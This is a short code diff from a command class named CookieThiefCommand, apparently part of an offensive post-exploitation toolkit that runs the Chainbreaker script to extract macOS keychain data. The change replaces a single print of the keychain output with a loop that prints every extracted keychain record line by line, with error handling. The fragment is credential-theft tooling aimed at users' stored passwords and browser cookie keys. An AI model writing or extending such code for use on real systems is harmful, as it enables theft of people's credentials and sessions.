@@ -97,9 +97,14 @@ class CookieThiefCommand(CommandBase):
             print("Chainbreaker script failed with error: " + str(e))
             sys.stdout.flush()
 
-
-        print(str(keychainoutput))
-        sys.stdout.flush()
+        try:
+            for record in record_collection['records']:
+                for line in str(record).split('\n'):
+                    print("%s" % line)
+                    sys.stdout.flush()
+        except Exception as e:
+            print("Print failed with error: " + str(e))
+            sys.stdout.flush()
 
 
         try:
